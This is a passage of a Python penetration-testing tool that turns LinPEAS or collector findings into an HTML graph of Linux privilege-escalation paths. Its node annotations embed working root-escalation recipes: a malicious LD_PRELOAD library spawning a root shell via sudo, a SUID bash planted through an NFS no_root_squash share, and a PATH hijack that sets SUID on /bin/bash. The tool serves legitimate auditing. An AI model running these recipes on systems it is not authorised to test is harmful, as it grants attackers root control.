            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-systemd-path"
        elif nid == "kernel":
            n["desc"] = f"Kernel {f.get('kernel','')} — potentially vulnerable to a public exploit."
            n["abuse"] = kernel_note(f.get("kernel", ""))
            n["ref"] = "https://github.com/The-Z-Labs/linux-exploit-suggester"
        elif nid.startswith("wrd:"):
            path = nid[4:]
            tech = ""
            for d, t in SENSITIVE_WRITABLE_DIRS.items():
                if path == d.rstrip("/") or path.startswith(d):
                    tech = t; break
            n["desc"] = f"{path} is a writable directory that feeds a root-run mechanism (sudoers / cron / systemd)."
            n["abuse"] = tech or f"Drop a privileged file into {path}."
        elif nid == "ldpreload":
            n["desc"] = "sudo keeps LD_PRELOAD/LD_LIBRARY_PATH (env_keep). You can preload a malicious library into any sudo-allowed command."
            n["abuse"] = ("cat > /tmp/x.c <<'EOF'\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n"
                          "void _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}\nEOF\n"
                          "gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c\n"
                          "sudo LD_PRELOAD=/tmp/x.so <any-allowed-command>")
            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload-and-ld_library_path"
        elif nid.startswith("nfs:"):
            share = nid[4:]
            n["desc"] = f"{share} is NFS-exported with no_root_squash — files you create as root on a box you control stay root here."
            n["abuse"] = (f"# on YOUR attacker box (as root):\n"
                          f"mkdir /mnt/x; mount -o rw <target-ip>:{share} /mnt/x\n"
                          f"cp /bin/bash /mnt/x/sh; chmod +s /mnt/x/sh\n"
                          f"# back on the target as your user:\n{share}/sh -p")
            n["ref"] = "https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe.html"
        elif nid.startswith("path:"):
            d = nid[5:]
            n["desc"] = f"{d} is writable AND in PATH. If a root process (cron/service) calls a binary by relative name, yours runs instead."
            n["abuse"] = (f"echo -e '#!/bin/bash\\nchmod +s /bin/bash' > {d}/<name-of-relative-binary>\n"
                          f"chmod +x {d}/<name>\n# when root runs it: bash -p")
        elif nid.startswith("kcve:") or nid.startswith("scve:"):
            cve = nid.split(":",1)[1]
            src = "kernel "+str(f.get("kernel","")) if nid.startswith("kcve:") else "sudo "+str(f.get("sudo_version",""))
            note = ""
            for (nm,c,nt) in (kernel_cve_matches(f.get("kernel")) + sudo_cve_matches(f.get("sudo_version"))):
                if c == cve: note = nt; break
            n["desc"] = (f"{src} falls in the affected range for {cve}. NOTE: version alone isn't proof — "
                         f"distros backport fixes, so confirm before firing.")
            n["abuse"] = note + "\n\n# verify first:  searchsploit "+cve+"   /   run linux-exploit-suggester"
            n["ref"] = "https://nvd.nist.gov/vuln/detail/" + cve

    order = {"confirmed": 0, "likely": 1, "info": 2}
    paths.sort(key=lambda p: (order[p["severity"]], len(p["hops"])))
    return {"nodes": list(nodes.values()), "edges": edges, "paths": paths}

# ─────────────────────────────────────────────────────────────────────────────
# HTML EMITTER  -  self-contained, offline, cytoscape + dagre inlined
# ─────────────────────────────────────────────────────────────────────────────

def emit_html(graph, findings, libdir, srcname):
    def lib(name):
        p = os.path.join(libdir, name)
        with open(p, "r", encoding="utf-8", errors="replace") as fh:
            return fh.read()
    cyto = lib("cytoscape.min.js")
    dagre = lib("dagre.min.js")
    cydagre = lib("cytoscape-dagre.js")

    confirmed = sum(1 for p in graph["paths"] if p["severity"] == "confirmed")
    likely    = sum(1 for p in graph["paths"] if p["severity"] == "likely")

    data = json.dumps(graph)
    data = (data.replace("<", "\\u003c").replace(">", "\\u003e")
            .replace("&", "\\u0026")
            .replace("\u2028", "\\u2028").replace("\u2029", "\\u2029"))
    tmpl = TEMPLATE
    tmpl = tmpl.replace("/*CYTO*/", cyto)
    tmpl = tmpl.replace("/*DAGRE*/", dagre)
    tmpl = tmpl.replace("/*CYDAGRE*/", cydagre)
    tmpl = tmpl.replace("__DATA__", data)
    tmpl = tmpl.replace("__SRC__", html.escape(srcname))
    tmpl = tmpl.replace("__CONFIRMED__", str(confirmed))
    tmpl = tmpl.replace("__LIKELY__", str(likely))
    return tmpl

# Template lives at bottom of file for readability
from template import TEMPLATE  # noqa

def load_findings(text):
    """Accept either our collector's JSON, or raw LinPEAS text (fallback)."""
    s = text.lstrip()
    if s.startswith("{"):
        try:
            j = json.loads(s)
        except Exception:
            return parse_linpeas(text)   # not valid JSON -> treat as LinPEAS
        # normalize into the same findings dict shape build_graph expects
        f = {
            "user": j.get("user", "current-user"),
            "groups": j.get("groups", []),
            "kernel": j.get("kernel") or None,
            "sudo_version": j.get("sudo_version") or None,
            "sudo_all": bool(j.get("sudo_all", False)),
            "ld_preload": bool(j.get("ld_preload", False)),
            "docker_sock": j.get("docker_sock", ""),
            "sudo": j.get("sudo", []),
            "suid": j.get("suid", []),
            "sgid": j.get("sgid", []),
            "caps": [tuple(c) if isinstance(c, list) else c for c in j.get("caps", [])],
            "cron": j.get("cron", []),
            "writable": j.get("writable", []),
            "writable_systemd": j.get("writable_systemd", []),
            "nfs": j.get("nfs", []),
            "path_hijack": j.get("path_hijack", []),
        }
        return f
    return parse_linpeas(text)

def main():
    ap = argparse.ArgumentParser(
        description="Linux privesc attack-path graph (offline). Input: nozecollect JSON or LinPEAS text.")
    ap.add_argument("input", help="nozecollect JSON file, or LinPEAS output text file")
    ap.add_argument("-o", "--out", default="privesc_graph.html", help="output HTML")
    ap.add_argument("--libdir", default=os.path.dirname(os.path.abspath(__file__)),
                    help="folder holding cytoscape.min.js / dagre.min.js / cytoscape-dagre.js")
    args = ap.parse_args()

    with open(args.input, "r", encoding="utf-8", errors="replace") as fh:
        text = fh.read()

    findings = load_findings(text)
    graph = build_graph(findings)
    out = emit_html(graph, findings, args.libdir, os.path.basename(args.input))
    with open(args.out, "w", encoding="utf-8") as fh:
        fh.write(out)

    c = sum(1 for p in graph["paths"] if p["severity"] == "confirmed")
    l = sum(1 for p in graph["paths"] if p["severity"] == "likely")
    print(f"[+] parsed: user={findings['user']} groups={findings['groups']} kernel={findings['kernel']}")
    print(f"[+] nodes={len(graph['nodes'])} edges={len(graph['edges'])} "
          f"paths: {c} confirmed, {l} likely")
    print(f"[+] wrote {args.out}  (open it in a browser - fully offline)")

if __name__ == "__main__":
    main()
